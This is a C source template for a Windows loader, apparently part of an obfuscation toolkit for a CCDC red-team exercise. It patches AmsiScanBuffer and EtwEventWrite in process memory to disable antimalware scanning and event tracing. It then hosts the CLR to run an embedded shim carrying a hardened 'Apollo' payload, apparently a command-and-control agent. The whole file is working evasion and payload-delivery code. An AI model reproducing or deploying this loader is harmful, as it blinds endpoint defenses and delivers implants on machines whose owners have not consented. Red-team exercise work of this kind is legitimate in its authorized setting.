/*
 * host.c -- Mode B native early-boot CLR host template (R5).
 *
 * Authorized CCDC-tryout exercise use only.  This file is the SOURCE template
 * that `obfuscate build-host` (host.py) interpolates and compiles with the
 * toolchain discovered on the dev laptop (cargo's gcc or standalone gcc/cl).
 * It is a single static, dependency-free C file: only the Windows system
 * headers and the kernel32/fts consciously imported DLLs are touched, there is
 * no third-party library, and there is no .NET SDK requirement on the deploy
 * host -- the deploy host runs ONLY the resulting self-contained
 * `patched_apollo.exe`.
 *
 * Interpolation contract (host.py; see host/README.md):
 *
 *   __RUNTIME_PATCH_ENABLED__  -> 1 or 0   (--no-patch gates the patch portion)
 *   __PATCH_AMSI_X86__         -> seed-derived AMSI x86 variant byte list
 *   __PATCH_AMSI_X64__         -> seed-derived AMSI x64 variant byte list
 *   __PATCH_ETW_X86__          -> seed-derived ETW x86 variant byte list
 *   __PATCH_ETW_X64__          -> seed-derived ETW x64 variant byte list
 *   __SHIM_BYTES__             -> compiled managed loader shim assembly bytes
 *
 * The runtime flow is:
 *
 *   1. Before ANY managed code runs, force-load amsi.dll/ntdll.dll and patch
 *      AmsiScanBuffer + EtwEventWrite in-process with the seed-derived
 *      variants (canonical public constants never appear verbatim; patching is
 *      idempotent).  --no-patch compiles this portion out for the canary
 *      baseline while leaving the rest of the executable structurally
 *      identical.
 *   2. Materialize the embedded managed loader shim (which itself carries the
 *      hardened Apollo bytes, see shim/ApolloShim.cs) to a temp file --
 *      ICLRRuntimeHost::ExecuteInDefaultAppDomain loads assemblies by file
 *      path and the framework offers no in-memory variant of that API.
 *   3. Host the CLR via mscoree!CLRCreateInstance ->
 *      ICLRMetaHost::GetRuntime("v4.0.30319") ->
 *      ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost) ->
 *      ICLRRuntimeHost::Start and execute the shim in the default AppDomain:
 *         ExecuteInDefaultAppDomain(temp_shim,
 *                                   L"CcdcShim.ApolloShim", L"Main", arg, &ret)
 *      Apollo's own Program.Main is a void WinExe entry point, which that API
 *      cannot invoke; the shim's public static int Main(string[]) can, and it
 *      loads the embedded harded payload and forwards via reflection.
 *   4. Remove the temp shim file and return the host exit code.
 *
 * Return codes: 0 success, 2 shim materialization failure, 3 CLR hosting
 * failure, 4 runtime-patch application failure (only when patching enabled).
 */

#include <windows.h>

/* -------------------------------------------------------------------------
 * host.py interpolation points
 * ---------------------------------------------------------------------- */

#define RUNTIME_PATCH_ENABLED __RUNTIME_PATCH_ENABLED__

#define OB_PATCH_AMSI_X86 { __PATCH_AMSI_X86__ }
#define OB_PATCH_AMSI_X64 { __PATCH_AMSI_X64__ }
#define OB_PATCH_ETW_X86  { __PATCH_ETW_X86__ }
#define OB_PATCH_ETW_X64  { __PATCH_ETW_X64__ }

#define OB_SHIM_BYTES { __SHIM_BYTES__ }

/* -------------------------------------------------------------------------
 * Host-mode detection markers (kept in sync with obfuscate/host.py and
 * obfuscate/verify.py: HOST_MARKER / EMBED_MARKER / PATCH_MARKER); documented
 * in host/README.md.  Verify.py scans compiled host images for these byte
 * constants to (a) distinguish host-mode outputs from regular hardened .NET
 * images and (b) structurally validate the embedded payload and the runtime
 * patch.
 *
 * DCE guard: the arrays are `volatile` and observably referenced by
 * ob_marker_fold(), which runs unconditionally from main() (its fold seeds
 * the transient shim temp-file prefix).  Without that reference the markers
 * would be eliminated at -O2 (gcc/cc) or /OPT:REF (cl) and verify could not
 * find them in a real build.  OB_PATCH_MARKER is gated by the SAME
 * `#if RUNTIME_PATCH_ENABLED` as the AMSI/ETW patch tables so a --no-patch
 * canary baseline carries no patch marker -- verify's `runtime_patch`
 * assertion then honestly reports the baseline as unpatched.
 * ---------------------------------------------------------------------- */

static volatile const unsigned char OB_HOST_MARKER[] = "OBFUSCATE_HOST_V1";
static volatile const unsigned char OB_EMBED_MARKER[] = { 0xAB, 0xCD, 0xEF, 0x01, 0xAB, 0xCD, 0xEF, 0x01 };
#if RUNTIME_PATCH_ENABLED
static volatile const unsigned char OB_PATCH_MARKER[] = "OBFUSCATE_PATCH_V1";
#endif

/* FNV-1a fold over the host-mode markers: the observable reference that keeps
 * them allocated in a compiled image (see the DCE guard above) and the seed
 * for the transient shim temp-file prefix. */
static unsigned int ob_marker_fold(void)
{
    unsigned int acc = 2166136261u;
    size_t i;
    for (i = 0; i < sizeof(OB_HOST_MARKER); ++i)
    {
        acc = (acc ^ OB_HOST_MARKER[i]) * 16777619u;
    }
    for (i = 0; i < sizeof(OB_EMBED_MARKER); ++i)
    {
        acc = (acc ^ OB_EMBED_MARKER[i]) * 16777619u;
    }
#if RUNTIME_PATCH_ENABLED
    for (i = 0; i < sizeof(OB_PATCH_MARKER); ++i)
    {
        acc = (acc ^ OB_PATCH_MARKER[i]) * 16777619u;
    }
#endif
    return acc;
}

/* Deterministic 3-char temp-file prefix derived from the marker fold.  The
 * prefix only shapes the transient shim file name (deleted before return), so
 * this is behavior-neutral while keeping ob_marker_fold() live in every
 * build. */
static void ob_marker_prefix(char *prefix) /* prefix[4] */
{
    static const char ob_pool[] = "acdehinst";
    unsigned int fold = ob_marker_fold();
    prefix[0] = ob_pool[(fold >> 0u) & 7u];
    prefix[1] = ob_pool[(fold >> 3u) & 7u];
    prefix[2] = ob_pool[(fold >> 6u) & 7u];
    prefix[3] = '\0';
}

/* -------------------------------------------------------------------------
 * Host arch selection (compile-time) and patch byte tables
 * ---------------------------------------------------------------------- */

#if defined(_WIN64) || defined(_M_AMD64) || defined(__x86_64__)
#define OB_HOST_ARCH_X64 1
#elif defined(_WIN32) || defined(__i386__)
#define OB_HOST_ARCH_X64 0
#else
#error "host.c supports only x86 and x64 host builds"
#endif

#if RUNTIME_PATCH_ENABLED
static const unsigned char AMSI_PATCH_X86[] = OB_PATCH_AMSI_X86;
static const unsigned char AMSI_PATCH_X64[] = OB_PATCH_AMSI_X64;
static const unsigned char ETW_PATCH_X86[]  = OB_PATCH_ETW_X86;
static const unsigned char ETW_PATCH_X64[]  = OB_PATCH_ETW_X64;
#endif

/* Embedded managed loader shim assembly bytes (carries the hardened Apollo
 * image; the payload itself lives inside the shim, see shim/README.md). */
static const unsigned char SHIM_BYTES[] = OB_SHIM_BYTES;

/* -------------------------------------------------------------------------
 * Runtime patch: in-process AMSI/ETW suppression, pre-managed-code.
 *
 * AMSI contract: patched AmsiScanBuffer leaves EAX == E_INVALIDARG
 * (0x80070057) and never writes memory, so the AMSI_RESULT out-parameter is
 * untouched.  ETW contract: patched EtwEventWrite leaves EAX == 0
 * (STATUS_SUCCESS).  Mirrors obfuscate/patch.py.
 * ---------------------------------------------------------------------- */

static size_t ob_copy(unsigned char *dst, const unsigned char *src, size_t n)
{
    size_t i;
    for (i = 0; i < n; ++i)
    {
        dst[i] = src[i];
    }
    return n;
}

static int ob_bytes_equal(const unsigned char *a, const unsigned char *b, size_t n)
{
    size_t i;
    for (i = 0; i < n; ++i)
    {
        if (a[i] != b[i])
        {
            return 0;
        }
    }
    return 1;
}

static void *ob_find_export(const char *dll_name, const char *export_name)
{
    HMODULE module;
    /* Force-load first so the export is reliably present (R5). */
    module = LoadLibraryA(dll_name);
    if (module == NULL)
    {
        module = GetModuleHandleA(dll_name);
    }
    if (module == NULL)
    {
        return NULL;
    }
    return (void *)GetProcAddress(module, export_name);
}

static int ob_patch_one(const char *dll_name, const char *export_name,
                        const unsigned char *patch, size_t patch_len)
{
    unsigned char *target;
    DWORD old_protect;

    if (patch == NULL || patch_len == 0)
    {
        return 0;
    }
    target = (unsigned char *)ob_find_export(dll_name, export_name);
    if (target == NULL)
    {
        return 0;
    }
    /* Idempotency: never re-patch a function that already carries our bytes. */
    if (ob_bytes_equal(target, patch, patch_len))
    {
        return 1;
    }
    if (!VirtualProtect(target, patch_len, PAGE_EXECUTE_READWRITE, &old_protect))
    {
        return 0;
    }
    ob_copy(target, patch, patch_len);
    VirtualProtect(target, patch_len, old_protect, &old_protect);
    FlushInstructionCache(GetCurrentProcess(), target, patch_len);
    return 1;
}

static int ob_apply_runtime_patch(void)
{
#if RUNTIME_PATCH_ENABLED
    const unsigned char *amsi = OB_HOST_ARCH_X64 ? AMSI_PATCH_X64 : AMSI_PATCH_X86;
    const unsigned char *etw  = OB_HOST_ARCH_X64 ? ETW_PATCH_X64 : ETW_PATCH_X86;
    const size_t amsi_len = OB_HOST_ARCH_X64 ? sizeof(AMSI_PATCH_X64) : sizeof(AMSI_PATCH_X86);
    const size_t etw_len  = OB_HOST_ARCH_X64 ? sizeof(ETW_PATCH_X64) : sizeof(ETW_PATCH_X86);

    if (!ob_patch_one("amsi.dll", "AmsiScanBuffer", amsi, amsi_len))
    {
        return 0;
    }
    if (!ob_patch_one("ntdll.dll", "EtwEventWrite", etw, etw_len))
    {
        return 0;
    }
    return 1;
#else
    /* --no-patch canary baseline: the runtime patch is compiled out entirely;
     * the rest of the image is structurally identical to the patched build. */
    return 1;
#endif
}

/* -------------------------------------------------------------------------
 * CLR hosting (ICLRRuntimeHost::ExecuteInDefaultAppDomain).
 *
 * mscoree.h's interface declarations are not guaranteed on every toolchain, so
 * the handful of CLR hosting interfaces this host needs are declared inline.
 * ---------------------------------------------------------------------- */

typedef struct ICLRMetaHost ICLRMetaHost;
typedef struct ICLRRuntimeInfo ICLRRuntimeInfo;
typedef struct ICLRRuntimeHost ICLRRuntimeHost;

typedef struct ICLRMetaHostVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRMetaHost *, REFIID, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRMetaHost *);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRMetaHost *);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(ICLRMetaHost *, LPCWSTR, REFIID, void **);
    HRESULT (STDMETHODCALLTYPE *GetVersionFromFile)(ICLRMetaHost *, LPCWSTR, LPWSTR, DWORD *, DWORD *);
    HRESULT (STDMETHODCALLTYPE *EnumerateInstalledRuntimes)(ICLRMetaHost *, void **);
    HRESULT (STDMETHODCALLTYPE *EnumerateLoadedRuntimes)(ICLRMetaHost *, HANDLE, void **);
    HRESULT (STDMETHODCALLTYPE *RequestRuntimeLoadedNotification)(ICLRMetaHost *, void *);
    HRESULT (STDMETHODCALLTYPE *QueryLegacyV2Activation)(ICLRMetaHost *, DWORD);
    HRESULT (STDMETHODCALLTYPE *ExitProcess)(ICLRMetaHost *, INT);
} ICLRMetaHostVtbl;

typedef struct ICLRRuntimeInfoVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRRuntimeInfo *, REFIID, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRRuntimeInfo *);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRRuntimeInfo *);
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(ICLRRuntimeInfo *, LPWSTR, DWORD *);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(ICLRRuntimeInfo *, LPWSTR, DWORD *);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(ICLRRuntimeInfo *, HANDLE, BOOL *);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(ICLRRuntimeInfo *, DWORD, LPWSTR, DWORD, LONG *);
    HRESULT (STDMETHODCALLTYPE *LoadLibrary)(ICLRRuntimeInfo *, LPCWSTR, HMODULE *);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress)(ICLRRuntimeInfo *, LPCSTR, void **);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(ICLRRuntimeInfo *, REFCLSID, REFIID, void **);
    HRESULT (STDMETHODCALLTYPE *SetDefaultStartupFlags)(ICLRRuntimeInfo *, DWORD, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *GetDefaultStartupFlags)(ICLRRuntimeInfo *, DWORD *, LPWSTR, DWORD *);
    HRESULT (STDMETHODCALLTYPE *BindAsLegacyV2Runtime)(ICLRRuntimeInfo *);
    HRESULT (STDMETHODCALLTYPE *IsStarted)(ICLRRuntimeInfo *, BOOL *);
} ICLRRuntimeInfoVtbl;

typedef struct ICLRRuntimeHostVtbl
{
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRRuntimeHost *, REFIID, void **);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRRuntimeHost *);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRRuntimeHost *);
    HRESULT (STDMETHODCALLTYPE *Start)(ICLRRuntimeHost *);
    HRESULT (STDMETHODCALLTYPE *Stop)(ICLRRuntimeHost *);
    HRESULT (STDMETHODCALLTYPE *SetHostControl)(ICLRRuntimeHost *, void *);
    HRESULT (STDMETHODCALLTYPE *GetCLRControl)(ICLRRuntimeHost *, void **);
    HRESULT (STDMETHODCALLTYPE *UnloadAppDomain)(ICLRRuntimeHost *, DWORD, BOOL);
    HRESULT (STDMETHODCALLTYPE *ExecuteInDefaultAppDomain)(ICLRRuntimeHost *, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD *);
} ICLRRuntimeHostVtbl;

struct ICLRMetaHost { const ICLRMetaHostVtbl *lpVtbl; };
struct ICLRRuntimeInfo { const ICLRRuntimeInfoVtbl *lpVtbl; };
struct ICLRRuntimeHost { const ICLRRuntimeHostVtbl *lpVtbl; };

static const GUID OB_CLSID_CLRMetaHost =
    { 0x9280188d, 0x0e8e, 0x4867, { 0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
static const GUID OB_IID_ICLRMetaHost =
    { 0xd332db9e, 0xb9b3, 0x4125, { 0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16 } };
static const GUID OB_IID_ICLRRuntimeInfo =
    { 0xbd39d1d2, 0xba2f, 0x486a, { 0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91 } };
static const GUID OB_CLSID_CLRRuntimeHost =
    { 0x90f1a06e, 0x7712, 0x4762, { 0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02 } };
static const GUID OB_IID_ICLRRuntimeHost =
    { 0x90f1a06c, 0x7712, 0x4762, { 0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02 } };

typedef HRESULT (STDMETHODCALLTYPE *OB_CLRCreateInstanceFn)(REFCLSID, REFIID, void **);

#define OB_EXIT_OK            0
#define OB_EXIT_SHIM          2
#define OB_EXIT_CLR           3
#define OB_EXIT_PATCH         4

static DWORD ob_write_all(HANDLE file, const unsigned char *data, size_t len)
{
    size_t off = 0;
    DWORD written;
    while (off < len)
    {
        DWORD chunk = (len - off) > 0x10000u ? 0x10000u : (DWORD)(len - off);
        if (!WriteFile(file, data + off, chunk, &written, NULL) || written == 0)
        {
            return 0;
        }
        off += written;
    }
    return 1;
}

/* Materialize the embedded shim to %TEMP% (one transient file; ExecuteInDefaultAppDomain loads by path). */
static int ob_materialize_shim(char *out_path, DWORD out_sz, const char *prefix)
{
    char temp_dir[MAX_PATH];
    DWORD dir_len;

    if (out_sz < MAX_PATH)
    {
        return 0;
    }
    dir_len = GetTempPathA(MAX_PATH, temp_dir);
    if (dir_len == 0 || dir_len > MAX_PATH)
    {
        return 0;
    }
    if (GetTempFileNameA(temp_dir, prefix, 0, out_path) == 0)
    {
        return 0;
    }
    {
        HANDLE file = CreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                  FILE_ATTRIBUTE_NORMAL, NULL);
        if (file == INVALID_HANDLE_VALUE)
        {
            return 0;
        }
        if (!ob_write_all(file, SHIM_BYTES, sizeof(SHIM_BYTES)))
        {
            CloseHandle(file);
            DeleteFileA(out_path);
            return 0;
        }
        CloseHandle(file);
    }
    return 1;
}

static HRESULT ob_host_clr(const wchar_t *shim_path, const wchar_t *argument)
{
    HMODULE mscoree;
    OB_CLRCreateInstanceFn create_fn;
    ICLRMetaHost *meta_host = NULL;
    ICLRRuntimeInfo *runtime_info = NULL;
    ICLRRuntimeHost *runtime_host = NULL;
    HRESULT hr;
    DWORD run_result = 0;

    mscoree = LoadLibraryA("mscoree.dll");
    if (mscoree == NULL)
    {
        return (HRESULT)0x8007007EU; /* MODULE_NOT_FOUND */
    }
    create_fn = (OB_CLRCreateInstanceFn)(void *)GetProcAddress(mscoree, "CLRCreateInstance");
    if (create_fn == NULL)
    {
        return E_NOINTERFACE;
    }
    hr = create_fn(&OB_CLSID_CLRMetaHost, &OB_IID_ICLRMetaHost, (void **)&meta_host);
    if (FAILED(hr) || meta_host == NULL)
    {
        return FAILED(hr) ? hr : E_NOINTERFACE;
    }
    hr = meta_host->lpVtbl->GetRuntime(meta_host, L"v4.0.30319",
                                       &OB_IID_ICLRRuntimeInfo, (void **)&runtime_info);
    meta_host->lpVtbl->Release(meta_host);
    if (FAILED(hr) || runtime_info == NULL)
    {
        return FAILED(hr) ? hr : E_NOINTERFACE;
    }
    hr = runtime_info->lpVtbl->GetInterface(runtime_info,
                                            &OB_CLSID_CLRRuntimeHost,
                                            &OB_IID_ICLRRuntimeHost,
                                            (void **)&runtime_host);
    runtime_info->lpVtbl->Release(runtime_info);
    if (FAILED(hr) || runtime_host == NULL)
    {
        return FAILED(hr) ? hr : E_NOINTERFACE;
    }
    hr = runtime_host->lpVtbl->Start(runtime_host);
    if (FAILED(hr))
    {
        runtime_host->lpVtbl->Release(runtime_host);
        return hr;
    }
    /* Execute the managed loader shim in the default AppDomain.  The method is
     * CcdcShim.ApolloShim.Main(string[]); the CLR passes `argument` through as
     * the single element of the string[] (per the hosting-API contract). */
    hr = runtime_host->lpVtbl->ExecuteInDefaultAppDomain(
        runtime_host, shim_path, L"CcdcShim.ApolloShim", L"Main", argument, &run_result);
    runtime_host->lpVtbl->Release(runtime_host);
    (void)run_result;
    return hr;
}

int main(void)
{
    HRESULT hr;
    char shim_path[MAX_PATH];
    char shim_prefix[4];
    wchar_t shim_path_wide[MAX_PATH];

    /* Always-executed marker fold: keeps the host-mode markers allocated in
     * the image AND seeds the transient shim temp-file prefix. */
    ob_marker_prefix(shim_prefix);

#if RUNTIME_PATCH_ENABLED
    /* Patch BEFORE any managed code runs so the in-process AMSI/ETW surfaces
     * are suppressed for the shim load and everything after it. */
    if (!ob_apply_runtime_patch())
    {
        return OB_EXIT_PATCH;
    }
#else
    /* --no-patch canary baseline -- a compile-time no-op. */
#endif

    if (!ob_materialize_shim(shim_path, sizeof(shim_path), shim_prefix))
    {
        return OB_EXIT_SHIM;
    }
    if (MultiByteToWideChar(CP_ACP, 0, shim_path, -1, shim_path_wide, MAX_PATH) == 0)
    {
        DeleteFileA(shim_path);
        return OB_EXIT_SHIM;
    }
    hr = ob_host_clr(shim_path_wide, GetCommandLineW());
    DeleteFileA(shim_path);
    if (FAILED(hr))
    {
        return OB_EXIT_CLR;
    }
    return OB_EXIT_OK;
}